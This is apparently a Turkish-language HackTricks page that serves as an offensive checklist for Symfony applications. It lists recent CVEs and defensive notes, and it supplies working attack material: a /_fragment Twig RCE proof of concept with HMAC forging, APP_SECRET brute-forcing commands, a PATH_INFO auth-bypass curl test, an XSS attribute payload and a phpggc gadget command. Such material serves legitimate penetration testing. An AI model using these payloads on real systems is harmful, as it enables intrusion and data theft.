# Symfony

{{#include ../../banners/hacktricks-training.md}}

Symfony, en yaygın kullanılan PHP framework'lerinden biridir ve kurumsal, e-ticaret ve CMS hedeflerinin (Drupal, Shopware, Ibexa, OroCRM … hepsi Symfony bileşenleri kullanır) değerlendirmelerinde düzenli olarak karşınıza çıkar. Bu sayfa, bir Symfony uygulaması keşfettiğinizde kontrol listenize eklemeniz gereken ofansif ipuçlarını, sık görülen yanlış yapılandırmaları ve yakın tarihli zafiyetleri toplar.

> Tarihçe: Ekosistemin büyük bir kısmı hâlâ **5.4 LTS** dalını kullanıyor (EOL **Kasım 2025**). Symfony **7.4** yeni LTS oldu (**Kasım 2025**) ve **Kasım 2029**'a kadar güvenlik düzeltmeleri alacak. Birçok 2024‑2026 danışmanlık bildirisi sadece micro sürümlerde düzeltildiği için her zaman kesin yama-seviyesini doğrulayın.

---

## Keşif & Enumeration

### Parmak izi çıkarma
* HTTP cevap başlıkları: `X-Powered-By: Symfony`, `X-Debug-Token`, `X-Debug-Token-Link` veya `sf_redirect`, `sf_session`, `MOCKSESSID` ile başlayan cookie'ler.
* Source code leaks (`composer.json`, `composer.lock`, `/vendor/…`) genellikle tam versiyonu açığa çıkarır:
```bash
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'
```
* Sadece Symfony'de bulunan public route'lar:
* `/_profiler`   (Symfony **Profiler** & debug toolbar)
* `/_wdt/<token>` (“Web Debug Toolbar”)
* `/_error/{code}.{_format}` (güzel hata sayfaları)
* `/app_dev.php`, `/config.php`, `/config_dev.php` (4.0 öncesi dev front-controller'lar)
* Wappalyzer, BuiltWith veya ffuf/feroxbuster wordlist'leri: `symfony.txt` → şunlara bakın: `/_fragment`, `/_profiler`, `.env`, `.htaccess`.

### İlginç dosyalar & endpoint'ler
| Path | Neden önemli |
|------|--------------|
| `/.env`, `/.env.local`, `/.env.prod` | Sıkça yanlış deploy edilir → leaks `APP_SECRET`, DB creds, SMTP, AWS keys |
| `/.git`, `.svn`, `.hg` | Kaynak ifşası → credentials + iş mantığı |
| `/var/log/*.log`, `/log/dev.log` | Web-root yanlış yapılandırması stack-traces'i açığa çıkarabilir |
| `/_profiler` | Tam istek geçmişi, yapılandırma, service container, **APP_SECRET** (≤ 3.4) |
| `/_fragment` | ESI/HInclude tarafından kullanılan giriş noktası. APP_SECRET bilindiğinde suistimal edilebilir |
| `/vendor/phpunit/phpunit/phpunit` | Erişilebilir ise PHPUnit RCE (CVE-2017-9841) |
| `/index.php/_error/{code}` | Parmak izi çıkarma & bazen exception trace'lerini leak eder |

---

## Yüksek etkili Güvenlik Açıkları

### 1. APP_SECRET disclosure ➜ RCE via `/_fragment` (aka “secret-fragment”)
* **CVE-2019-18889** ilk olarak raporlandı, ancak debug açık bırakıldığında veya `.env` açık bırakıldığında modern hedeflerde *hala* görülüyor.
* 32 karakterlik `APP_SECRET`'i öğrendiğinizde, bir HMAC token oluşturup internal `render()` controller'ını kullanarak rastgele Twig çalıştırabilirsiniz:
```python
# PoC – requires the secret
import hmac, hashlib, requests, urllib.parse as u
secret = bytes.fromhex('deadbeef…')
payload = "{{['id']|filter('system')}}"   # RCE in Twig
query = {
'template': '@app/404.html.twig',
'filter': 'raw',
'_format': 'html',
'_locale': 'en',
'globals[cmd]': 'id'
}
qs = u.urlencode(query, doseq=True)
token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()
r = requests.get(f"https://target/_fragment?{qs}&_token={token}")
print(r.text)
```
* Detaylı write-up & exploitation script: Ambionics blog (References'te linkli).

### 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)
* 5.4.50, 6.4.29 ve 7.3.7 altı sürümleri etkiler. Path normalizasyonu baştaki `/` karakterini düşürebilir, bu da `/admin` gibi varsayılan erişim-kontrol kurallarını atlatabilir.
* Hızlı test: `curl -H 'PATH_INFO: admin/secret' https://target/index.php` → eğer kimlik doğrulama olmadan admin route'larına erişiliyorsa zafiyeti buldunuz.
* Düzeltme: `symfony/http-foundation` veya framework'ü sabitlenmiş yama seviyesine yükseltin.

### 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)
* MSYS2 (Git-Bash, mingw) üzerinden PHP çalıştırıldığında Windows'ta 5.4.51, 6.4.33, 7.3.11, 7.4.5 ve 8.0.5 altı sürümleri etkiler. `Process` `=` karakterini quote'lamayı başarısız kılarak path'lerin bozulmasına neden olur; `rmdir`, `del` gibi yıkıcı komutlar hedef dışı dizinlere yönelebilir.
* Eğer bir PHP betiği yükleyebiliyorsanız veya `Process` çağıran Composer/CLI helper'larını etkileyebiliyorsanız, `=` içeren argümanlar (ör. `E:/=tmp/delete`) hazırlayarak path yeniden yazımına neden olun.

### 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)
* `register_argv_argc=On` ve non‑SAPI runtime'lar kullanıldığında, hazırlanmış query string'ler `argv` parsing'i yoluyla `APP_ENV`/`APP_DEBUG`'ı değiştirebilir. 5.4.46/6.4.14/7.1.7'de düzeltildi.
* Loglarda `/?--env=prod` veya benzerlerinin kabul edilip edilmediğine bakın.

### 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)
* URI'deki özel karakterler tarayıcıların yaptığı şekilde doğrulanmıyordu, bu da saldırgan kontrollü domain'lere redirect yapılmasını mümkün kılıyordu. 5.4.46/6.4.14/7.1.7'de düzeltildi.

### 6. Symfony UX attribute injection – **CVE-2025-47946**
* `symfony/ux-twig-component` & `symfony/ux-live-component` 2.25.1 öncesi sürümleri `{{ attributes }}`'ı escape etmeden render eder → attribute injection / XSS. Uygulama kullanıcıların component attribute değerleri tanımlamasına izin veriyorsa (admin CMS, email şablonlama) bunu script injection'a zincirleyebilirsiniz.
* Her iki paketi 2.25.1+ sürümüne güncelleyin. Manuel exploit olarak, custom bir component'a geçen attribute değerine JS koyup render tetikleyin.

### 7. Windows Process Hijack – **CVE-2024-51736** (Process)
* `Process` component'i Windows'ta `PATH`'ten önce çalışma dizinini arıyordu. Web-root'a yazma izni olan bir saldırgan `tar.exe`, `cmd.exe` gibi dosyaları yükleyip `Process`'i tetikleyerek (ör. dosya açma, PDF üretim) komut yürütme elde edebilir.
* 5.4.50, 6.4.14, 7.1.7'de düzeltildi.

### 8. Session-Fixation – **CVE-2023-46733**
* Authentication guard, login sonrası mevcut session ID'yi yeniden kullandı. Bir saldırgan kurban autentike olmadan önce cookie'yi ayarlarsa, login sonrası hesabı ele geçirebilir.

### 9. Twig sandbox XSS – **CVE-2023-46734**
* Kullanıcı kontrollü template'ler (admin CMS, email builder) sunan uygulamalarda `nl2br` filtresi sandbox'ı atlatabilecek şekilde suistimal edilebiliyordu ve JS enjeksiyonuna yol açabiliyordu.

### 10. Symfony 1 gadget chains (still found in legacy apps)
* `phpggc symfony/1 system id` bir Phar payload üretir; `unserialize()` sırasında `sfNamespacedParameterHolder` gibi sınıflar tetiklendiğinde RCE oluşur. Dosya yükleme endpoint'lerini ve `phar://` wrapper'larını kontrol edin.


{{#ref}}
../../pentesting-web/deserialization/php-deserialization-+-autoload-classes.md
{{#endref}}

---

## İstismar Kısa Rehberi

### Calculate HMAC token for `/_fragment`
```bash
python - <<'PY'
import sys, hmac, hashlib, urllib.parse as u
secret = bytes.fromhex(sys.argv[1])
qs     = u.quote_plus(sys.argv[2], safe='=&')
print(hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest())
PY deadbeef… "template=@App/evil&filter=raw&_format=html"
```
### Bruteforce zayıf `APP_SECRET`
```bash
cewl -d3 https://target -w words.txt
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```
### Erişilebilir Symfony Console üzerinden RCE
Eğer `bin/console` `php-fpm` üzerinden veya doğrudan CLI upload ile erişilebiliyorsa:
```bash
php bin/console about        # confirm it works
php bin/console cache:clear --no-warmup
```
cache dizini içinde deserialization gadgets kullanın veya bir sonraki istekte çalıştırılacak kötü amaçlı bir Twig şablonu yazın.

### PATH_INFO bypass'ını hızlıca test edin (CVE-2025-64500)
```bash
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php
# If it returns protected content without redirect/auth, the Request normalization is vulnerable.
```
### Spray UX attribute injection (CVE-2025-47946)
```twig
{# attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```
If the rendered output echoes the attribute unescaped, XSS succeeds. Patch to 2.25.1+.

---

## Savunma notları
1. **Debug modunu asla üretime dağıtmayın** (`APP_ENV=dev`, `APP_DEBUG=1`); web sunucusu konfigürasyonunda `/app_dev.php`, `/_profiler`, `/_wdt` yollarını engelleyin.
2. Gizli bilgileri env değişkenlerinde veya `vault/secrets.local.php` içinde saklayın, *asla* document-root üzerinden erişilebilen dosyalarda tutmayın.
3. Yama yönetimini uygulayın – Symfony güvenlik duyurularına abone olun ve en az LTS yama seviyesini koruyun (5.4.x Kasım 2025'e kadar, 6.4 Kasım 2027'ye kadar, 7.4 Kasım 2029'a kadar).
4. Windows üzerinde çalışıyorsanız, CVE-2024-51736 ve CVE-2026-24739 etkilerini hafifletmek için derhal yükseltme yapın veya savunma derinliği için `open_basedir`/`disable_functions` ekleyin.

---

### Kullanışlı saldırı araçları
* **ambionics/symfony-exploits** – secret-fragment RCE, debugger routes keşfi.
* **phpggc** – Symfony 1 & 2 için hazır gadget zincirleri.
* **sf-encoder** – `_fragment` HMAC hesaplamak için küçük yardımcı (Go implementasyonu).



## References
* [Ambionics – Symfony “secret-fragment” Remote Code Execution](https://www.ambionics.io/blog/symfony-secret-fragment)
* [Symfony Security Advisory – CVE-2024-51736: Command Execution Hijack on Windows Process Component](https://symfony.com/blog/cve-2024-51736-command-execution-hijack-on-windows-with-process-class)
* [Symfony Blog – CVE-2025-47946: Unsanitized HTML attribute injection in UX components](https://symfony.com/blog/symfony-ux-cve-2025-47946-unsanitized-html-attribute-injection-via-componentattributes)
* [Symfony Blog – CVE-2026-24739: Incorrect argument escaping under MSYS2/Git Bash](https://symfony.com/blog/cve-2026-24739-incorrect-argument-escaping-under-msys2-git-bash-on-windows-can-lead-to-destructive-file-operations)
{{#include ../../banners/hacktricks-training.md}}
